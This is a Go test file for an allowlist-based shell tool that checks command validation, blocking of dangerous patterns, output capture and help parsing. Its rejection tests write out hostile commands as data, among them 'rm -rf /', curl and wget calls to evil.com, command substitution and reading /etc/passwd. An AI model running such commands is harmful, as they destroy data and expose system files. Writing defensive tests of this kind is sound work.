package tools

import (
	"strings"
	"testing"

	"github.com/marciniwanicki/crabby/internal/config"
)

func testSettings() *config.Settings {
	return &config.Settings{
		Tools: config.ToolsSettings{
			Shell: config.ShellSettings{
				Enabled:   true,
				Allowlist: []string{"echo", "date", "pwd", "ls"},
			},
		},
	}
}

func TestShellTool_Name(t *testing.T) {
	tool := NewShellTool(testSettings())
	if tool.Name() != "shell" {
		t.Errorf("expected name 'shell', got %q", tool.Name())
	}
}

func TestShellTool_Description(t *testing.T) {
	tool := NewShellTool(testSettings())
	desc := tool.Description()

	if !strings.Contains(desc, "echo") {
		t.Error("description should contain allowlist commands")
	}
	if !strings.Contains(desc, "date") {
		t.Error("description should contain allowlist commands")
	}
}

func TestShellTool_Parameters(t *testing.T) {
	tool := NewShellTool(testSettings())
	params := tool.Parameters()

	if params["type"] != "object" {
		t.Error("parameters should be an object type")
	}

	props, ok := params["properties"].(map[string]any)
	if !ok {
		t.Fatal("parameters should have properties")
	}

	if props["command"] == nil {
		t.Error("parameters should have 'command' property")
	}

	required, ok := params["required"].([]string)
	if !ok {
		t.Fatal("parameters should have required array")
	}

	found := false
	for _, r := range required {
		if r == "command" {
			found = true
			break
		}
	}
	if !found {
		t.Error("'command' should be required")
	}
}

func TestShellTool_Execute_AllowedCommand(t *testing.T) {
	tool := NewShellTool(testSettings())

	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{"simple echo", "echo hello", false},
		{"echo with args", "echo hello world", false},
		{"date command", "date", false},
		{"pwd command", "pwd", false},
		{"ls command", "ls", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := tool.Execute(map[string]any{"command": tt.command})
			if tt.wantErr && err == nil {
				t.Error("expected error")
			}
			if !tt.wantErr && err != nil {
				t.Errorf("unexpected error: %v", err)
			}
			if !tt.wantErr && result == "" {
				t.Error("expected non-empty result")
			}
		})
	}
}

func TestShellTool_Execute_DisallowedCommand(t *testing.T) {
	tool := NewShellTool(testSettings())

	tests := []struct {
		name    string
		command string
	}{
		{"rm command", "rm -rf /"},
		{"curl command", "curl http://evil.com"},
		{"wget command", "wget http://evil.com"},
		{"bash command", "bash -c 'echo pwned'"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := tool.Execute(map[string]any{"command": tt.command})
			if err == nil {
				t.Error("expected error for disallowed command")
			}
			if !strings.Contains(err.Error(), "not in allowlist") {
				t.Errorf("expected 'not in allowlist' error, got: %v", err)
			}
		})
	}
}

func TestShellTool_Execute_DangerousPatterns(t *testing.T) {
	tool := NewShellTool(testSettings())

	tests := []struct {
		name    string
		command string
		pattern string
	}{
		{"command chaining with &&", "echo hello && rm -rf /", "&&"},
		{"command chaining with ||", "echo hello || rm -rf /", "||"},
		{"command chaining with ;", "echo hello; rm -rf /", ";"},
		{"pipe operator", "echo hello | cat", "|"},
		{"backtick substitution", "echo `whoami`", "`"},
		{"dollar substitution", "echo $(whoami)", "$("},
		{"variable expansion", "echo ${HOME}", "${"},
		{"output redirection", "echo hello > /tmp/file", ">"},
		{"input redirection", "cat < /etc/passwd", "<"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := tool.Execute(map[string]any{"command": tt.command})
			if err == nil {
				t.Error("expected error for dangerous pattern")
			}
			if !strings.Contains(err.Error(), "disallowed pattern") {
				t.Errorf("expected 'disallowed pattern' error, got: %v", err)
			}
		})
	}
}

func TestShellTool_Execute_MissingCommand(t *testing.T) {
	tool := NewShellTool(testSettings())

	_, err := tool.Execute(map[string]any{})
	if err == nil {
		t.Error("expected error for missing command")
	}
	if !strings.Contains(err.Error(), "missing required parameter") {
		t.Errorf("expected 'missing required parameter' error, got: %v", err)
	}
}

func TestShellTool_Execute_InvalidCommandType(t *testing.T) {
	tool := NewShellTool(testSettings())

	_, err := tool.Execute(map[string]any{"command": 123})
	if err == nil {
		t.Error("expected error for invalid command type")
	}
	if !strings.Contains(err.Error(), "must be a string") {
		t.Errorf("expected 'must be a string' error, got: %v", err)
	}
}

func TestShellTool_Execute_EmptyCommand(t *testing.T) {
	tool := NewShellTool(testSettings())

	_, err := tool.Execute(map[string]any{"command": ""})
	if err == nil {
		t.Error("expected error for empty command")
	}
	if !strings.Contains(err.Error(), "empty command") {
		t.Errorf("expected 'empty command' error, got: %v", err)
	}
}

func TestShellTool_Execute_CapturesOutput(t *testing.T) {
	tool := NewShellTool(testSettings())

	result, err := tool.Execute(map[string]any{"command": "echo test-output"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !strings.Contains(result, "test-output") {
		t.Errorf("expected output to contain 'test-output', got: %q", result)
	}
}

func TestShellTool_Execute_CapturesStderr(t *testing.T) {
	tool := NewShellTool(testSettings())

	// ls on non-existent file should produce stderr
	result, err := tool.Execute(map[string]any{"command": "ls /nonexistent-file-12345"})

	// Should have error (non-zero exit)
	if err == nil {
		t.Error("expected error for ls on non-existent file")
	}

	// Should capture stderr output
	if result == "" {
		t.Error("expected stderr to be captured in result")
	}
}

func TestWellKnownCommands(t *testing.T) {
	// Verify some common commands are in the well-known list
	expectedWellKnown := []string{"ls", "cat", "echo", "grep", "find", "date", "pwd"}

	for _, cmd := range expectedWellKnown {
		if !wellKnownCommands[cmd] {
			t.Errorf("expected %q to be a well-known command", cmd)
		}
	}
}

func TestShellTool_HelpCache(t *testing.T) {
	tool := NewShellTool(testSettings())

	// Verify cache is initialized empty
	tool.cacheMu.RLock()
	if len(tool.helpCache) != 0 {
		t.Error("expected empty help cache on initialization")
	}
	tool.cacheMu.RUnlock()

	// Well-known commands should not populate the cache
	_, _ = tool.Execute(map[string]any{"command": "echo hello"})

	tool.cacheMu.RLock()
	if len(tool.helpCache) != 0 {
		t.Error("well-known commands should not populate help cache")
	}
	tool.cacheMu.RUnlock()
}

func TestParseSubcommands(t *testing.T) {
	tool := NewShellTool(testSettings())

	helpText := `Usage: mycli <command> [options]

Commands:
  deploy      Deploy the application
  status      Show current status
  rollback    Rollback to previous version

Options:
  --help      Show help
`
	subcommands := tool.parseSubcommands(helpText)

	expected := []string{"deploy", "status", "rollback"}
	if len(subcommands) != len(expected) {
		t.Errorf("expected %d subcommands, got %d: %v", len(expected), len(subcommands), subcommands)
		return
	}

	for i, exp := range expected {
		if subcommands[i] != exp {
			t.Errorf("expected subcommand %q at index %d, got %q", exp, i, subcommands[i])
		}
	}
}

func TestIsValidSubcommand(t *testing.T) {
	tests := []struct {
		input string
		valid bool
	}{
		{"deploy", true},
		{"my-command", true},
		{"cmd_name", true},
		{"cmd123", true},
		{"--flag", true}, // dashes are allowed, prefix check happens separately
		{"cmd with space", false},
		{"cmd@special", false},
	}

	for _, tt := range tests {
		result := isValidSubcommand(tt.input)
		if result != tt.valid {
			t.Errorf("isValidSubcommand(%q) = %v, want %v", tt.input, result, tt.valid)
		}
	}
}
